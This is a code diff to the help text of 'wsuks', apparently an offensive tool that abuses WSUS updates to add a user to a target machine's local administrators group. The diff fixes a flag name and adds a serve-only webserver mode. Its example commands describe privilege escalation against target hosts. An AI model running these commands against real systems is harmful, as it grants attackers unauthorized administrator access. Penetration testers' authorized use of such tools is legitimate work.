@@ -27,9 +27,10 @@ def printBanner():
 
 def initParser():
     example_text = """Examples:
-    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                   # Generates a new user&password and adds it to the local admin group
-    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local           # Adds the domain user to the local admin group
-    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                    # Generates a new user&password and adds it to the local admin group
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local            # Adds the domain user to the local admin group
+    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local --dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
+    wsuks --serve-only                                                                 # Only run webserver to serve the executable and command
     """
     mode_parser = argparse.ArgumentParser(add_help=False)
 
